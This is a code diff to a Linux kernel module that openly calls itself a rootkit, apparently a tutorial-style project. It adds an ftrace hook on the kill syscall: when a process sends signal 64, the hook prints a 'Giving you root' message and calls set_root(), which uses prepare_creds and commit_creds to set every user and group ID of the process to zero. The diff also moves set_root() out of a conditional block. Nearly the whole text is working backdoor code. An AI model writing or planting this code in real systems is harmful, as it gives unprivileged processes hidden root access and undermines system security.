@@ -18,6 +18,21 @@ MODULE_VERSION("0.01");
 
 #ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
+static asmlinkage long (*orig_kill)(const struct pt_regs *);
+
+asmlinkage int hook_kill(const struct pt_regs *regs) {
+    void set_root(void);
+
+    int sig = regs->si;
+
+    if ( sig == 64 ) {
+        printk(KERN_INFO, "[!] Rootkit: Giving you root. Standby...\n");
+        set_root();
+        return 0;
+    }
+
+    return orig_kill(regs);
+}
 
 asmlinkage int hook_mkdir(const struct pt_regs *regs)
 {
@@ -39,21 +54,6 @@ asmlinkage int hook_mkdir(const struct pt_regs *regs)
 */
 static asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);
 static asmlinkage long (*orig_kill)(pid_t pid, int sig);
-
-void set_root(void) {
-    struct cred *root;
-    root = prepare_creds();
-
-    if (root == NULL)
-        return;
-
-    root->uid.val   = root->gid.val     = 0;
-    root->euid.val  = root->egid.val    = 0;
-    root->suid.val  = root->sgid.val    = 0;
-    root->fsuid.val = root->fsgid.val   = 0;
-
-    commit_creds(root);
-}
 
 asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode)
 {
@@ -82,6 +82,21 @@ asmlinkage int hook_kill(const struct pt_regs *regs) {
     return orig_kill(regs);
 }
 #endif
+
+void set_root(void) {
+    struct cred *root;
+    root = prepare_creds();
+
+    if (root == NULL)
+        return;
+
+    root->uid.val   = root->gid.val     = 0;
+    root->euid.val  = root->egid.val    = 0;
+    root->suid.val  = root->sgid.val    = 0;
+    root->fsuid.val = root->fsgid.val   = 0;
+
+    commit_creds(root);
+}
 
 static struct ftrace_hook hooks[] = {
     HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
